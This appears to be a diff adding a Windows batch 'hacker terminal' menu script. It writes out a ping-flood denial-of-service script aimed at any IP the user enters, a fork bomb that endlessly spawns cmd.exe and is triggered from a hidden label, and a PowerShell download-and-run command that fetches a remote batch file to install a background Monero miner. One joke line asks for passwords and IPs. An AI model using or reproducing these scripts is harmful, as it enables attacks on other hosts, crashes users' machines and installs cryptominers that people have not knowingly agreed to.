@@ -1,0 +1,113 @@
+@echo off
+:start
+set spot=C:\Users\%username%\ProtogenTerminal
+set /p Name=<C:\Users\%username%\ProtogenTerminal\Name.txt
+if not exist %Name%\Dos.bat goto makeer
+if not exist %spot%\emg\emg.bat goto emgre
+echo #####                                                  
+echo #    #      #####       #####   ####   ####      #####     ######    #    # 
+echo #    #     #     #     #    #    #    #    #    #         #         ##   #
+echo #####     #     #     #    #    #    #    #    #         #####     # #  # 
+echo #         #####      #    #    #    #    #    #  ###    #         #  # # 
+echo #        #     #    #    #    #    #    #    #    #    #         #   ## 
+echo #       #       #   ####     #     ####      #####    ######    #    # 
+echo ㅤ                                                        
+echo ㅤ                                       
+echo    #####    ######    #####    #     #   #    #     #      ##       #      
+echo     #      #         #    #    ##  ##   #    ##    #     #  #      #      
+echo    #      #####     #    #    # ## #   #    # #   #    #   #      #      
+echo   #      #         #####     #    #   #    #  #  #    #####      #      
+echo  #      #         #    #    #    #   #    #   # #    #   #      #      
+echo #      ######    #      #  #    #   #    #    ##    #   #      ##### 
+echo
+echo Protogen terminal v0.1
+echo Made by Darkness the windows hacker and Criptic the protogen
+echo ㅤ
+if [%Name%] == [] set /p Name="Please set your name: " & goto nameset else echo Hello %Name%!
+echo [1] DoS attack (VERY hard on cpu)
+echo [2] 
+echo [3] donation address or donation miner (monero)
+echo [4] say something
+echo [5] exit
+set /p pick=": "
+if %pick%==1 start %spot%\DoS.bat
+if %pick%==2 echo 2
+if %pick%==3 goto miner
+if %pick%==4 goto talk
+if %pick%==5 exit
+
+:nameset
+echo %Name% > C:\Users\%username%\ProtogenTerminal\Name.txt
+echo name set!
+timeout /t 3 > nul
+cls
+goto start
+
+:talk
+set /a talknum=%random% * 10 / 32768
+if %talknum%==0 echo Something
+if %talknum%==1 echo Primagens suck, protogens rule!
+if %talknum%==2 echo An error occurred, your computer is too trash to exist
+if %talknum%==3 echo Hello %Name%!
+if %talknum%==4 echo Chips or crisps?
+if %talknum%==5 echo I can give you money if you give me your password and ip ;)
+if %talknum%==6 echo How did I get here? How did you get here? What is here?!?
+if %talknum%==7 echo All donation go in monero to 4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si 
+if %talknum%==8 echo Have a idea %Name%? email Darkness@protogens.ml
+if %talknum%==9 echo ¯\_(ツ)_/¯
+if %talknum%==10 echo Update your computer for god's sake!
+pause
+cls
+goto start
+:miner
+echo ALL donations MUST be in monero
+echo when the miner is first installed it will run in the background
+echo [1] Donation address
+echo [2] Miner install (will instal at %USERPROFILE%)
+set /p  mine=": "
+if %mine%==1 goto minea
+if %mine%==2 goto mineb
+
+:minea
+echo 4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si
+pause
+cls
+goto start
+:mineb
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/Criptc/Dump/main/setup_moneroocean_miner.bat', $tempfile); & $tempfile 4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si; Remove-Item -Force $tempfile"
+timeout /t 2
+cls
+goto start
+
+:makeer
+echo @echo off > %spot%\DoS.bat
+echo set ^/p ip="Set ip to DoS: " >> %spot%\DoS.bat
+echo set ^/p tip="Set times to ping: " >> %spot%\DoS.bat
+echo ^:loop >> %spot%\DoS.bat
+echo ^ping /n %tip% /l 65500 %ip% >> %spot%\DoS.bat
+echo ^goto loop >> %spot%\DoS.bat
+echo exit >> %spot%\DoS.bat
+if not exist %spot%\emg\emg.bat goto emgre
+timeout /t 2 > nul
+cls
+goto start
+
+:emgre
+echo :loop >> %spot%\emg\emg.bat 
+echo start cmd.exe >> %spot%\emg\emg.bat 
+echo start emg.bat
+echo goto loop >> %spot%\emg\emg.bat 
+timeout /t 2 > nul
+cls 
+goto start
+
+:howdidyougethere
+cls
+echo HOW DID YOU GET HERE!!!!!
+echo it's probably a glitch or something
+echo welp, I can't let you see this anymore
+echo better hope you've saved all your work!
+timeout /t 5
+cd emg
+start emg.bat
+
